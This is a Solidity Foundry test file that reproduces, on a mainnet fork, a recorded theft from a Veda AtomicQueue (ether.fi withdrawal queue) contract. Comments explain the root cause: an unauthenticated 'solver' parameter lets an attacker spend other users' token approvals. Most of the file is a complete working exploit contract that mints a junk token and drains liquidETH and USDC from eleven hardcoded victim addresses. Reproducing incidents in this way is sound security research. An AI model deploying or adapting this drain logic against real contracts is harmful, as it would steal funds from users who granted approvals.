// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~15.45 ETH (~$38.2k) after swapping stolen liquidETH (+ dust USDC)
// Attacker EOA         : 0xa5CC6e490Bce9185fA47b421f2EaC677A83B64Ea
// Attack contract      : 0x7f5A5f66ebF8afc301fFe3739305c356B110DEC1 (CREATE + selfdestruct in the live tx)
// Inner helper         : 0x679c53fF03c5c60aAC538a019cA9d69C5DFa663E
// Vulnerable contract  : 0xD45884B592E316eB816199615A95C182F75dea07 (Veda AtomicQueue / ether.fi Withdrawal Queue)
// Stolen asset         : 0xf0bb20865277aBd641a307eCe5Ee04E79073416C (ether.fi Liquid / liquidETH)
// Attack tx            : https://etherscan.io/tx/0x7cbe0b4349513fed6d03ba8bf9ed708e10e07a501d10b5f344a25ae10595599b
// Alert                : https://x.com/exvulsec/status/2098318467556692298
//
// Root cause: AtomicQueue.solve() takes an unauthenticated caller-supplied `solver`.
// It transfers the request owner's offer token to that solver, then calls
// IAtomicSolver(solver).finishSolve(...) — a no-op on an EOA (void external call
// succeeds with empty returndata) — then does
//     want.safeTransferFrom(solver, user, assetsToUser);
// Anyone who previously approved the queue can be named as solver and have that
// approval spent as the *want* token. A no-capital attacker mints a worthless
// ERC20, self-requests it as `offer` while `want`ing liquidETH, and sizes
// offerAmount so atomicPrice * offerAmount / 10^decimals equals each victim's
// approved balance.

address constant ATTACKER = 0xa5CC6e490Bce9185fA47b421f2EaC677A83B64Ea;
address constant QUEUE = 0xD45884B592E316eB816199615A95C182F75dea07;
address constant LIQUID_ETH = 0xf0bb20865277aBd641a307eCe5Ee04E79073416C;
address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

// Attack mined in Ethereum block 25952624 (2026-09-11 07:20 UTC); fork one block earlier.
uint256 constant FORK_BLOCK = 25_952_623;

interface IAtomicQueue {
    struct AtomicRequest {
        uint64 deadline;
        uint88 atomicPrice;
        uint96 offerAmount;
        bool inSolve;
    }

    function updateAtomicRequest(address offer, address want, AtomicRequest calldata userRequest) external;
    function solve(address offer, address want, address[] calldata users, bytes calldata runData, address solver)
        external;
}

contract EtherFiVedaAtomicQueue_exp is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        fundingToken = LIQUID_ETH;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(QUEUE, "Veda AtomicQueue");
        vm.label(LIQUID_ETH, "liquidETH");
        vm.label(USDC, "USDC");

        // AtomicQueue is compiled with solc 0.8.21, which inserts an extcodesize
        // check on the high-level finishSolve call. Empty EOAs therefore revert.
        // Live victims were 7702-delegated accounts / tiny wallets whose unknown-
        // selector path was a no-op. Teach the same callback with STOP bytecode.
        _etchNoopSolver(0x69da29127BC31909c26080105B585345DDe847D4);
        _etchNoopSolver(0x1226C76300A2a611182c08614B260c88bd6DB3B1);
        _etchNoopSolver(0xeE8D39AB46C685889B3E4A31347deDB5739D553D);
        _etchNoopSolver(0x0EACbaA94AEcc4e51d299a99915F64EE96F3b468);
        _etchNoopSolver(0x13B90df23158808185B247aB61EDe61b75d49E23);
        _etchNoopSolver(0x0ec7E8C2DDdEC157589208D19feF4927607CCfD1);
        _etchNoopSolver(0x516E726f53576Ee00Db9B96291CDD0F7EB5F8Cc7);
        _etchNoopSolver(0x4D4Ef453CF782926825F5768499C7e02DaA3A9E7);
        _etchNoopSolver(0x2cFb075E8FC0D99837653629B0A3d527f0769a1A);
        _etchNoopSolver(0x047e7CFA2702f95DE867A86a74CaF60E2DdBFF72);
        _etchNoopSolver(0xEaBf4c3eA4bDef8A1eEf812296023D866D6E0F1A);
    }

    function _etchNoopSolver(address victim) internal {
        vm.etch(victim, hex"00");
    }

    function testExploit() public balanceLog {
        EtherFiVedaAtomicQueueExploit exploit = new EtherFiVedaAtomicQueueExploit(ATTACKER);

        uint256 liquidBefore = IERC20(LIQUID_ETH).balanceOf(ATTACKER);
        uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 liquidProfit = IERC20(LIQUID_ETH).balanceOf(ATTACKER) - liquidBefore;
        uint256 usdcProfit = IERC20(USDC).balanceOf(ATTACKER) - usdcBefore;
        emit log_named_decimal_uint("liquidETH profit", liquidProfit, 18);
        emit log_named_decimal_uint("USDC profit", usdcProfit, 6);
        logTokenBalance(LIQUID_ETH, ATTACKER, "Attacker Final liquidETH");
        logTokenBalance(USDC, ATTACKER, "Attacker Final USDC");

        // Live tx pulled 14.445541086626480232 liquidETH (+ 7.047848 USDC dust) from 11 approvers.
        assertGt(liquidProfit, 14 ether, "liquidETH profit");
        assertGt(usdcProfit, 7e6, "USDC dust");
    }
}

/// Minimal mintable ERC20. The queue treats it as a real `offer` asset.
contract JunkToken {
    string public name = "yoink";
    string public symbol = "YOINK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract EtherFiVedaAtomicQueueExploit {
    address private immutable owner;
    IAtomicQueue private constant queue = IAtomicQueue(QUEUE);
    IERC20 private constant liquidEth = IERC20(LIQUID_ETH);
    IERC20 private constant usdc = IERC20(USDC);

    // Same 9 liquidETH + 2 USDC approvers the live constructor hardcoded.
    address[9] private liquidVictims = [
        0x69da29127BC31909c26080105B585345DDe847D4,
        0x1226C76300A2a611182c08614B260c88bd6DB3B1,
        0xeE8D39AB46C685889B3E4A31347deDB5739D553D,
        0x0EACbaA94AEcc4e51d299a99915F64EE96F3b468,
        0x13B90df23158808185B247aB61EDe61b75d49E23,
        0x0ec7E8C2DDdEC157589208D19feF4927607CCfD1,
        0x516E726f53576Ee00Db9B96291CDD0F7EB5F8Cc7,
        0x4D4Ef453CF782926825F5768499C7e02DaA3A9E7,
        0x2cFb075E8FC0D99837653629B0A3d527f0769a1A
    ];
    address[2] private usdcVictims =
        [0x047e7CFA2702f95DE867A86a74CaF60E2DdBFF72, 0xEaBf4c3eA4bDef8A1eEf812296023D866D6E0F1A];

    constructor(address owner_) {
        owner = owner_;
    }

    function attack() external {
        require(msg.sender == owner, "not attacker");

        JunkToken junk = new JunkToken();
        junk.mint(address(this), 100 ether);
        junk.approve(QUEUE, type(uint256).max);

        // Teaching solve: self-request 1:1 junk→liquidETH and name the largest
        // approver as the unauthenticated solver.
        address first = liquidVictims[0];
        uint256 stealable = _stealable(LIQUID_ETH, first);
        IAtomicQueue.AtomicRequest memory req = IAtomicQueue.AtomicRequest({
            deadline: type(uint64).max,
            atomicPrice: uint88(1 ether),
            offerAmount: uint96(stealable),
            inSolve: false
        });
        queue.updateAtomicRequest(address(junk), LIQUID_ETH, req);

        address[] memory users = new address[](1);
        users[0] = address(this);
        queue.solve(address(junk), LIQUID_ETH, users, "", first);

        for (uint256 i = 1; i < liquidVictims.length; ++i) {
            _drain(address(junk), LIQUID_ETH, liquidVictims[i]);
        }
        for (uint256 i = 0; i < usdcVictims.length; ++i) {
            _drain(address(junk), USDC, usdcVictims[i]);
        }

        liquidEth.transfer(owner, liquidEth.balanceOf(address(this)));
        usdc.transfer(owner, usdc.balanceOf(address(this)));
    }

    function _drain(address junk, address want, address victim) internal {
        uint256 stealable = _stealable(want, victim);
        if (stealable == 0) return;

        IAtomicQueue.AtomicRequest memory req = IAtomicQueue.AtomicRequest({
            deadline: type(uint64).max,
            atomicPrice: uint88(1 ether),
            offerAmount: uint96(stealable),
            inSolve: false
        });
        queue.updateAtomicRequest(junk, want, req);

        address[] memory users = new address[](1);
        users[0] = address(this);
        queue.solve(junk, want, users, "", victim);
    }

    function _stealable(address token, address victim) internal view returns (uint256 amt) {
        uint256 bal = IERC20(token).balanceOf(victim);
        uint256 allowed = IERC20(token).allowance(victim, QUEUE);
        amt = bal < allowed ? bal : allowed;
        if (amt > type(uint96).max) amt = type(uint96).max;
    }
}
